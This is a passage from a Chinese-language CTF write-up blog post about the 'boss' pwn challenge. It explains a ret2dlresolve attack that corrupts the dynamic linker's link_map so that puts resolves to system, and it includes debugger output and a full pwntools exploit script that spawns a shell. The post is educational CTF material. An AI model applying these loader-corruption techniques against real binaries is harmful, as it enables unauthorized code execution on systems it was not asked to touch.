    <span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">));</span>
    
    <span class="n">puts</span><span class="p">(</span><span class="n">passwd</span><span class="p">);</span>
    <span class="n">_Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="大致内容比较明确从passwd开始的位置可以8字节一组任意写前提是知道原本那个地址的内容是什么这道题比较难回显所以考虑ret2dlresolve想法是由于puts在最后才会第一次调用也就是那时会调用一次__dl_runtime_resolve来重定位puts另外的由于无法控制压栈的内容所以解释puts时的rel_arg和linkmap不能变所以放弃伪造linkmap由于mmap的空间在ld内存的低位而且偏移不变所以可以尝试修改到ld的内容改变linkmap内的内容实现误导__dl_runtime_resolve">   大致内容比较明确，从passwd开始的位置可以8字节一组任意写，前提是知道原本那个地址的内容是什么。<br>   这道题比较难回显，所以考虑ret2dlresolve。想法是，由于<code class="language-plaintext highlighter-rouge">puts()</code>在最后才会第一次调用，也就是那时会调用一次<code class="language-plaintext highlighter-rouge">__dl_runtime_resolve</code>来重定位<code class="language-plaintext highlighter-rouge">puts</code>.<br>   另外的，由于无法控制压栈的内容，所以解释<code class="language-plaintext highlighter-rouge">puts</code>时的<code class="language-plaintext highlighter-rouge">rel_arg</code>和<code class="language-plaintext highlighter-rouge">linkmap</code>不能变，所以放弃伪造<code class="language-plaintext highlighter-rouge">linkmap</code>。<br>   由于mmap的空间在ld内存的低位，而且偏移不变，所以可以尝试修改到ld的内容，改变linkmap内的内容，实现误导<code class="language-plaintext highlighter-rouge">__dl_runtime_resolve</code>。</h5> <h5 id="首先查看一下linkmap的地址发现都在ld内重点修改的是执行文件的linkmap">   首先查看一下linkmap的地址，发现都在ld内，重点修改的是执行文件的linkmap</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">linkmap</span>
<span class="n">Node</span>           <span class="n">Objfile</span>                                                            <span class="n">Load</span> <span class="n">Bias</span>      <span class="n">Dynamic</span> <span class="n">Segment</span> 
<span class="mh">0x7ffff7ffe2e0</span> <span class="o">&lt;</span><span class="n">Unknown</span><span class="p">,</span> <span class="n">likely</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">worktable</span><span class="o">/</span><span class="n">cnss2024</span><span class="o">/</span><span class="n">boss</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">attachment</span><span class="o">&gt;</span> <span class="mh">0x555555554000</span> <span class="mh">0x555555557df8</span>  
<span class="mh">0x7ffff7ffe890</span> <span class="n">linux</span><span class="o">-</span><span class="n">vdso</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">1</span>                                                    <span class="mh">0x7ffff7fc1000</span> <span class="mh">0x7ffff7fc13a0</span>  
<span class="mh">0x7ffff7fbb160</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>                                    <span class="mh">0x7ffff7d83000</span> <span class="mh">0x7ffff7f9cbc0</span>  
<span class="mh">0x7ffff7ffdaf0</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>                                        <span class="mh">0x7ffff7fc3000</span> <span class="mh">0x7ffff7ffce80</span>  
</code></pre></div></div> <h5 id="思路是重定向时__dl_runtime_resolve会借助dynstr中的字符串在libc的linkmap中查找目标字符串的偏移这个偏移libc基址-被写到gotplt中所以这里实际上有两种方法第一种方法伪造一个dynstr使重定位查找到的不是puts而是system第二种方法修改linkmap中libc的基地址使gotplt中被写入我们指定的函数博主的方法是第一种方法并且使用docker容器作为环境但是这种方法在docker容器中直接运行可以getshelldocker容器把attachment挂到端口上打远程时就不行推测是直接运行的文件的内存布局和挂在端口上的不一样尝试爆破出两者的偏移结果也没用">   思路是，重定向时<code class="language-plaintext highlighter-rouge">__dl_runtime_resolve</code>会借助<code class="language-plaintext highlighter-rouge">.dynstr</code>中的字符串，在libc的linkmap中查找目标字符串的偏移，这个偏移+libc基址 被写到.got.plt中。所以这里实际上有两种方法，第一种方法，伪造一个.dynstr，使重定位查找到的不是<code class="language-plaintext highlighter-rouge">puts</code>，而是<code class="language-plaintext highlighter-rouge">system</code>；第二种方法，修改linkmap中libc的基地址，使.got.plt中被写入我们指定的函数。<br>   博主的方法是第一种方法，并且使用docker容器作为环境，但是这种方法在docker容器中直接运行可以getshell，docker容器把attachment挂到端口上打远程时就不行，推测是直接运行的文件的内存布局和挂在端口上的不一样，尝试爆破出两者的偏移结果也没用。</h5> <h5 id="exppy仅供参考更具体的思路是将linkmap中的l-infodt_strtab修改最后一位lsb变为l-infodt_debug的地址dt_debug结构体的地址成员指向的是ldso中的一段可读写内存所以在这个位置的0x3eputs字符串在dynstr中的偏移偏移处伪造一个systemx00字样0x3e偏移处正好全是x00方便了工作">   exp.py仅供参考，更具体的思路是将linkmap中的<code class="language-plaintext highlighter-rouge">l-&gt;info[DT_STRTAB]</code>修改最后一位(LSB)，变为<code class="language-plaintext highlighter-rouge">l-&gt;info[DT_DEBUG]</code>的地址，DT_DEBUG结构体的地址成员指向的是ld.so中的一段可读写内存，所以在这个位置的0x3e（puts字符串在.dynstr中的偏移）偏移处伪造一个<code class="language-plaintext highlighter-rouge">system\x00</code>字样，0x3e偏移处正好全是<code class="language-plaintext highlighter-rouge">\x00</code>，方便了工作。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">os</span> <span class="kn">import</span> <span class="n">system</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="sh">''</span><span class="p">):</span>
    <span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">gdb --pi={}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">pid</span><span class="p">))</span>
    <span class="c1">#system("gdb -q -ex 'target remote localhost:8000'")
</span>    <span class="nf">pause</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">key</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="n">crypto</span><span class="p">):</span> <span class="c1"># 目标比特串，原本的比特串
</span>    <span class="n">key</span> <span class="o">=</span> <span class="sh">''</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
        <span class="n">temp</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">sh</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">crypto</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="n">key</span> <span class="o">+=</span> <span class="n">temp</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
        <span class="n">ret</span> <span class="o">+=</span> <span class="nf">pow</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="nf">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">def</span> <span class="nf">xorsend</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>

<span class="c1"># io = remote("152.136.11.155",10039)
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">localhost</span><span class="sh">"</span><span class="p">,</span> <span class="mi">8000</span><span class="p">)</span>
<span class="c1"># io = process("./boss/src/attachment")
</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>
<span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="c1"># passwd头部改成'sh\0'，绕过strncmp()
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">dea</span><span class="sh">'</span><span class="p">)))</span>
<span class="c1"># print(io.recvline())
# 修改l-&gt;info[DT_STRTAB]的LSB，指向l-&gt;info[DT_DEBUG]
</span><span class="n">of</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="o">*</span><span class="p">(</span><span class="o">-</span><span class="mi">6</span><span class="p">)</span>
<span class="n">offset1</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x7ffff7ffe348</span> <span class="o">-</span> <span class="mh">0x7ffff7fb9000</span> <span class="o">+</span> <span class="n">of</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span> <span class="c1"># 0x45348 0x4a348
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">offset1</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xb8</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x78</span><span class="sh">'</span><span class="p">)))</span>
<span class="c1"># 在0x3e处开始伪造system\x00字样
</span><span class="n">offset2</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x7ffff7ffe118</span> <span class="o">-</span> <span class="mh">0x7ffff7fb9000</span> <span class="o">+</span> <span class="n">of</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span> <span class="c1"># 0x45118 0x4a118
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">offset2</span> <span class="o">+</span> <span class="mi">7</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x73\x79</span><span class="sh">'</span><span class="p">.</span><span class="nf">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">),</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)))</span>

<span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">offset2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x73\x74\x65\x6d</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">),</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)))</span>
<span class="sh">'''</span><span class="s">
0x7f1e1f0f1148: 0x0000000000000000      0x7379000000000000
0x7f1e1f0f1158: 0x000000007374656d      0x0000000000000000
</span><span class="sh">'''</span>
<span class="c1"># 再把开头处改成'/bin/sh\0'，跳出循环
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="s">dbeef</span><span class="sh">'</span><span class="p">)))</span>
<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div> <h5 id="第二种方法是出题人迪普朋克提示的但没有想到怎么实现puts和system在libc中的偏移有16进制下的五位之多由于无法泄露libc基址异或最多修改三位所以不知道具体怎么写">   第二种方法是出题人迪普朋克提示的，但没有想到怎么实现，<code class="language-plaintext highlighter-rouge">puts</code>和<code class="language-plaintext highlighter-rouge">system()</code>在libc中的偏移有16进制下的五位之多，由于无法泄露libc基址，异或最多修改三位，所以不知道具体怎么写。</h5> <h5 id="补几天之后打通了远程发现是nc远程启动的进程和docker容器内本地启动的进程内存布局不一样mmap分配的空间的位置不一样把上面exp的地址改一下就可以">   补：几天之后打通了远程，发现是nc远程启动的进程和docker容器内本地启动的进程内存布局不一样，<code class="language-plaintext highlighter-rouge">mmap()</code>分配的空间的位置不一样，把上面exp的地址改一下就可以。</h5> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="https://blog.google/technology/ai/google-gemini-update-flash-ai-assistant-io-2024/" target="_blank" rel="external nofollow noopener">Google Gemini updates: Flash 1.5, Gemma 2 and Project Astra</a> <svg width="1rem" height="1rem" viewbox="0 0 30 30" xmlns="http://www.w3.org/2000/svg"> <path d="M17 13.5v6H5v-12h6m3-3h6v6m0-6-9 9" class="icon_svg-stroke" stroke="#999" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path> </svg> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="https://medium.com/@al-folio/displaying-external-posts-on-your-al-folio-blog-b60a1d241a0a?source=rss-17feae71c3c4------2" target="_blank" rel="external nofollow noopener">Displaying External Posts on Your al-folio Blog</a> <svg width="1rem" height="1rem" viewbox="0 0 30 30" xmlns="http://www.w3.org/2000/svg"> <path d="M17 13.5v6H5v-12h6m3-3h6v6m0-6-9 9" class="icon_svg-stroke" stroke="#999" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path> </svg> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/ONNX/">ONNX-opt day0</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%8F%8A%E8%B0%83%E8%AF%95/">内核模块开发环境及调试</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/C++%E6%80%8E%E4%B9%88UAF/">[水贴]C++应该怎么UAF</a> </li> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Leak Box 258. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?c8a01c11a92744d44b093fc3bda915df" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?a5bb4e6a542c546dd929b24b8b236dfd"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
    addBackToTop();
  </script> <script type="module" src="/assets/js/search/ninja-keys.min.js?a3446f084dcaecc5f75aa1757d087dcf"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Type to start searching"></ninja-keys> <script src="/assets/js/search-setup.js?6c304f7b1992d4b60f7a07956e52f04a"></script> <script src="/assets/js/search-data.js"></script> <script src="/assets/js/shortcut-key.js?6f508d74becd347268a7f822bca7309d"></script> </body> </html>